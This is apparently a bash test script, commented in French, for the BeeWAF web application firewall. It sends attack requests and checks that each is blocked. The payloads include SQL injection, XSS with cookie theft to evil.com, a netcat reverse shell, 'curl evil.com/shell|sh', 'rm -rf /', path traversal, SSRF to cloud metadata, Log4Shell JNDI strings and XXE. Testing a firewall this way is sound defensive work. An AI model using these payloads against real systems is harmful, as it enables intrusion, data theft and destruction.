#!/bin/bash
# =============================================================================
# 🐝 BeeWAF Enterprise v6.0 — Script de Test Complet
#
# Ce script teste TOUTES les capacités du WAF:
#   - 16 catégories d'attaques (SQLi, XSS, CMDi, LFI, SSRF, ...)
#   - Détection ML + Regex + Modules spécialisés
#   - Rate limiting
#   - Bot detection
#   - Requêtes légitimes (vérification pass-through)
#   - Endpoints admin (/health, /metrics, /admin/rules)
#
# Usage:
#   bash k8s/test-waf.sh                           # Via port-forward (défaut)
#   bash k8s/test-waf.sh https://beewaf.dpc.com.tn # Via URL externe
#   bash k8s/test-waf.sh http://192.168.90.10:30439 # Via NodePort
#
# Prérequis: curl
# =============================================================================

set -uo pipefail

# ── Configuration ──
BASE_URL="${1:-http://localhost:8080}"
TOTAL=0
BLOCKED=0
PASSED=0
ERRORS=0
RESULTS=()

# ── Couleurs ──
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

echo -e "${BOLD}${CYAN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║  🐝 BeeWAF Enterprise v6.0 — Test Complet du WAF           ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  🎯 Cible: ${BOLD}${BASE_URL}${NC}"
echo ""

# Si pas d'URL externe, démarrer le port-forward
PF_PID=""
if [[ "$BASE_URL" == "http://localhost:8080" ]]; then
    echo -e "${YELLOW}  🔌 Démarrage port-forward vers BeeWAF...${NC}"
    kubectl port-forward svc/beewaf-svc 8080:80 -n beewaf &>/dev/null &
    PF_PID=$!
    sleep 3
    echo -e "${GREEN}  ✅ Port-forward actif (localhost:8080)${NC}"
fi

cleanup() {
    if [ -n "$PF_PID" ]; then
        kill $PF_PID 2>/dev/null
    fi
}
trap cleanup EXIT

# ── Fonction de test ──
test_request() {
    local METHOD="$1"
    local PATH="$2"
    local DESCRIPTION="$3"
    local EXPECTED="$4"  # "block" ou "pass"
    local BODY="${5:-}"
    local EXTRA_HEADERS="${6:-}"
    
    TOTAL=$((TOTAL + 1))
    
    local CURL_OPTS="-s -o /dev/null -w %{http_code} --max-time 10 -k"
    local IP="$((RANDOM % 250 + 1)).$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))"
    
    if [ "$METHOD" = "GET" ]; then
        HTTP_CODE=$(curl $CURL_OPTS -X GET \
            -H "X-Forwarded-For: $IP" \
            -H "Host: beewaf.dpc.com.tn" \
            $EXTRA_HEADERS \
            "${BASE_URL}${PATH}" 2>/dev/null || echo "000")
    else
        HTTP_CODE=$(curl $CURL_OPTS -X "$METHOD" \
            -H "X-Forwarded-For: $IP" \
            -H "Host: beewaf.dpc.com.tn" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            $EXTRA_HEADERS \
            -d "$BODY" \
            "${BASE_URL}${PATH}" 2>/dev/null || echo "000")
    fi
    
    local RESULT=""
    local STATUS=""
    
    if [ "$HTTP_CODE" = "403" ]; then
        BLOCKED=$((BLOCKED + 1))
        if [ "$EXPECTED" = "block" ]; then
            STATUS="${GREEN}✅ BLOQUÉ${NC}"
            RESULT="PASS"
        else
            STATUS="${RED}❌ FAUX-POSITIF${NC}"
            RESULT="FP"
        fi
    elif [ "$HTTP_CODE" = "000" ]; then
        ERRORS=$((ERRORS + 1))
        STATUS="${RED}❌ ERREUR${NC}"
        RESULT="ERR"
    else
        PASSED=$((PASSED + 1))
        if [ "$EXPECTED" = "pass" ]; then
            STATUS="${GREEN}✅ PASSÉ ($HTTP_CODE)${NC}"
            RESULT="PASS"
        else
            STATUS="${RED}❌ NON-DÉTECTÉ ($HTTP_CODE)${NC}"
            RESULT="MISS"
        fi
    fi
    
    printf "    %-6s %-45s %b\n" "[$HTTP_CODE]" "$DESCRIPTION" "$STATUS"
    RESULTS+=("$RESULT:$DESCRIPTION")
}

# ═══════════════════════════════════════════════════════════════════════════
# Section 0 : Vérification de connectivité
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[0] 🔗 Test de connectivité...${NC}"
HEALTH=$(curl -s --max-time 10 -k "${BASE_URL}/health" 2>/dev/null)
if echo "$HEALTH" | grep -q "healthy"; then
    echo -e "    ${GREEN}✅ BeeWAF accessible et en bonne santé${NC}"
    RULES=$(echo "$HEALTH" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total_rules','?'))" 2>/dev/null || echo "?")
    ML=$(echo "$HEALTH" | python3 -c "import sys,json; print(json.load(sys.stdin).get('ml_engine','?'))" 2>/dev/null || echo "?")
    echo -e "    📊 Règles: $RULES | ML: $ML"
else
    echo -e "    ${RED}❌ BeeWAF non accessible à ${BASE_URL}${NC}"
    echo -e "    Vérifiez la connexion et réessayez."
    exit 1
fi
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 1 : SQL Injection (10 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[1] 💉 SQL Injection (SQLi)${NC}"
test_request GET "/?id=1'+OR+'1'='1"                    "Basic OR injection"       block
test_request GET "/?id=1;+DROP+TABLE+users--"            "DROP TABLE"               block
test_request GET "/?q=admin'--"                          "Comment bypass"           block
test_request GET "/?q=1'+UNION+SELECT+username+FROM+users--" "UNION SELECT"        block
test_request GET "/?id=1'+AND+SLEEP(5)--"                "Time-based blind"         block
test_request GET "/?id=1'+AND+1=CONVERT(int,@@version)--" "Error-based"            block
test_request POST "/search" "Blind SQLi via POST"        block "q=1'+AND+1=1--"
test_request GET "/?id=1'+ORDER+BY+100--"                "Column enumeration"       block
test_request GET "/?id=-1'+UNION+ALL+SELECT+NULL,table_name+FROM+information_schema.tables--" "Schema dump" block
test_request GET "/?id=1'+OR+1=1+LIMIT+1--"              "Auth bypass"              block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 2 : Cross-Site Scripting (XSS) (10 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[2] 🔥 Cross-Site Scripting (XSS)${NC}"
test_request GET "/?q=<script>alert('XSS')</script>"     "Reflected XSS basic"      block
test_request GET "/?q=<img+src=x+onerror=alert(1)>"      "Event handler XSS"        block
test_request GET "/?q=<svg/onload=alert('XSS')>"         "SVG XSS"                  block
test_request GET "/?q=javascript:alert(document.cookie)"  "JS protocol"             block
test_request GET "/?q=<body+onload=alert(1)>"             "Body event XSS"          block
test_request GET "/?q=%3Cscript%3Ealert(1)%3C/script%3E" "URL-encoded XSS"          block
test_request GET "/?q=<iframe+src='javascript:alert(1)'>" "Iframe XSS"              block
test_request GET '/?q="><script>alert(1)</script>'        "Breakout XSS"             block
test_request GET "/?q=<details/open/ontoggle=alert(1)>"   "HTML5 event XSS"         block
test_request POST "/comment" "Stored XSS attempt"         block "body=<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 3 : Command Injection (8 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[3] 💻 Command Injection${NC}"
test_request GET "/?cmd=;cat+/etc/passwd"                "Semicolon injection"      block
test_request GET "/?cmd=|ls+-la"                         "Pipe injection"           block
test_request GET "/?file=test;whoami"                    "Inline command"           block
test_request GET '/?cmd=$(id)'                           "Command substitution"     block
test_request GET '/?input=`cat+/etc/shadow`'             "Backtick injection"       block
test_request GET "/?cmd=;nc+-e+/bin/sh+10.0.0.1+4444"   "Reverse shell"            block
test_request GET "/?cmd=|curl+http://evil.com/shell|sh"  "Remote execution"         block
test_request GET "/?dir=;rm+-rf+/"                       "Destructive command"      block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 4 : Path Traversal / LFI (8 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[4] 📁 Path Traversal / LFI${NC}"
test_request GET "/../../etc/passwd"                     "Basic traversal"          block
test_request GET "/..%2f..%2f..%2fetc/passwd"            "URL-encoded traversal"    block
test_request GET "/?file=../../../etc/shadow"             "File param traversal"     block
test_request GET "/?page=....//....//....//etc/passwd"    "Double-dot bypass"       block
test_request GET "/?file=/proc/self/environ"              "Proc environ"            block
test_request GET "/?file=php://filter/convert.base64-encode/resource=config" "PHP wrapper" block
test_request GET "/?file=file:///etc/hostname"            "File protocol"           block
test_request GET "/?file=%252e%252e%252f%252e%252e%252fetc/passwd" "Double-encode" block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 5 : SSRF (6 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[5] 🌐 Server-Side Request Forgery (SSRF)${NC}"
test_request GET "/?url=http://169.254.169.254/latest/meta-data/" "AWS metadata"    block
test_request GET "/?url=http://127.0.0.1:22"              "Localhost scan"          block
test_request GET "/?url=http://localhost:6379/"            "Redis access"            block
test_request GET "/?url=http://[::1]:8080"                "IPv6 localhost"          block
test_request GET "/?redirect=http://metadata.google.internal/computeMetadata/v1/" "GCP metadata" block
test_request GET "/?url=http://0x7f000001:80"             "Hex IP bypass"           block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 6 : Log4Shell (3 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[6] ☢️  Log4Shell (CVE-2021-44228)${NC}"
test_request GET '/?q=${jndi:ldap://evil.com/a}'          "Basic JNDI"             block
test_request GET '/?q=${jndi:rmi://evil.com/exploit}'     "RMI JNDI"               block
test_request GET '/?q=${${lower:j}ndi:ldap://evil.com/x}' "Obfuscated JNDI"       block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 7 : SSTI (4 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[7] 🧪 Server-Side Template Injection (SSTI)${NC}"
test_request GET "/?name={{7*7}}"                         "Jinja2 SSTI"             block
test_request GET "/?name={{config.items()}}"               "Config leak"             block
test_request GET '/?q=${7*7}'                             "Expression language"      block
test_request GET "/?q=<%25=+7*7+%25>"                     "ERB template"            block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 8 : XXE (3 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[8] 📄 XML External Entity (XXE)${NC}"
test_request POST "/api/data" "XXE file read" block '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' '-H "Content-Type: application/xml"'
test_request POST "/api/data" "XXE SSRF" block '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>' '-H "Content-Type: application/xml"'
test_request POST "/api/data" "XXE expect" block '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>' '-H "Content-Type: application/xml"'
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 9 : Scanner Detection (6 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[9] 🤖 Scanner / Bot Detection${NC}"
test_request GET "/.env"              "Env file probe"       block "" '-H "User-Agent: sqlmap/1.7"'
test_request GET "/wp-admin/"         "WP admin probe"       block "" '-H "User-Agent: WPScan v3.8"'
test_request GET "/.git/config"       "Git config leak"      block "" '-H "User-Agent: Nikto/2.5"'
test_request GET "/phpmyadmin/"       "phpMyAdmin probe"     block "" '-H "User-Agent: DirBuster-1.0"'
test_request GET "/server-status"     "Server status probe"  block "" '-H "User-Agent: Nmap Scripting Engine"'
test_request GET "/actuator/health"   "Spring actuator"      block "" '-H "User-Agent: gobuster/3.6"'
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 10 : NoSQL Injection (3 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[10] 🗃️ NoSQL Injection${NC}"
test_request GET '/?q={"$gt":""}'                         "MongoDB operator"        block
test_request GET "/?user[\$ne]=null&pass[\$ne]=null"      "Array operator"          block
test_request POST "/api/login" "JSON NoSQL inject" block '{"username":{"$gt":""},"password":{"$gt":""}}' '-H "Content-Type: application/json"'
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 11 : Sensitive Paths (5 tests)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[11] 🔒 Sensitive Path Access${NC}"
test_request GET "/.env"                "Env file"            block
test_request GET "/.git/HEAD"           "Git HEAD"            block
test_request GET "/config.php"          "Config file"         block
test_request GET "/wp-config.php"       "WP config"           block
test_request GET "/backup.sql"          "SQL backup"          block
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 12 : Requêtes LÉGITIMES (doivent passer)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[12] ✅ Requêtes Légitimes (doivent PASSER)${NC}"
test_request GET "/"                    "Page d'accueil"      pass
test_request GET "/about"               "Page about"          pass
test_request GET "/contact"             "Page contact"        pass
test_request GET "/search?q=laptop"     "Recherche légitime"  pass
test_request GET "/api/v1/status"       "API status"          pass
test_request GET "/products"            "Liste produits"      pass
test_request GET "/search?q=phone+case" "Recherche espace"    pass
test_request POST "/api/login" "Login normal" pass "username=user&password=pass123"
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# Section 13 : Endpoints WAF (health, metrics, admin)
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}[13] 📊 Endpoints WAF${NC}"
echo -ne "    /health     → "
HEALTH_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -k "${BASE_URL}/health")
echo -e "${GREEN}${HEALTH_CODE}${NC}"

echo -ne "    /metrics    → "
METRICS_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -k "${BASE_URL}/metrics")
echo -e "${GREEN}${METRICS_CODE}${NC}"

echo -ne "    /admin/rules → "
RULES_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -k "${BASE_URL}/admin/rules")
echo -e "${GREEN}${RULES_CODE}${NC}"

echo -ne "    /admin/stats → "
STATS_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -k "${BASE_URL}/admin/stats")
echo -e "${GREEN}${STATS_CODE}${NC}"
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# RÉSUMÉ FINAL
# ═══════════════════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}╔═══════════════════════════════════════════════════════════════╗"
echo -e "║              📊 RÉSUMÉ DES TESTS BeeWAF                     ║"
echo -e "╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BOLD}Total requêtes:${NC}    $TOTAL"
echo -e "  ${GREEN}🚫 Bloquées:${NC}       $BLOCKED"
echo -e "  ${CYAN}✅ Autorisées:${NC}     $PASSED"
echo -e "  ${RED}❌ Erreurs:${NC}        $ERRORS"
echo ""

if [ $TOTAL -gt 0 ]; then
    BLOCK_RATE=$(echo "scale=1; $BLOCKED * 100 / $TOTAL" | bc)
    echo -e "  ${BOLD}📈 Taux de blocage global: ${YELLOW}${BLOCK_RATE}%${NC}"
fi

# Compter les résultats
PASS_COUNT=0
MISS_COUNT=0
FP_COUNT=0
for r in "${RESULTS[@]}"; do
    case "${r%%:*}" in
        PASS) PASS_COUNT=$((PASS_COUNT + 1)) ;;
        MISS) MISS_COUNT=$((MISS_COUNT + 1)) ;;
        FP)   FP_COUNT=$((FP_COUNT + 1)) ;;
    esac
done

echo ""
echo -e "  ${BOLD}Résultats détaillés:${NC}"
echo -e "    ${GREEN}✅ Tests réussis:${NC}      $PASS_COUNT"
echo -e "    ${RED}❌ Non-détectés:${NC}      $MISS_COUNT"
echo -e "    ${YELLOW}⚠️  Faux-positifs:${NC}    $FP_COUNT"

if [ $TOTAL -gt 0 ]; then
    ACCURACY=$(echo "scale=1; $PASS_COUNT * 100 / $TOTAL" | bc)
    echo -e "    ${BOLD}📊 Précision:${NC}         ${ACCURACY}%"
fi

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  🐝 Test BeeWAF terminé !${NC}"
echo -e "  💡 Les résultats sont maintenant visibles dans Kibana"
echo -e "  📊 Dashboard: Analytics → Dashboard → BeeWAF Enterprise"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
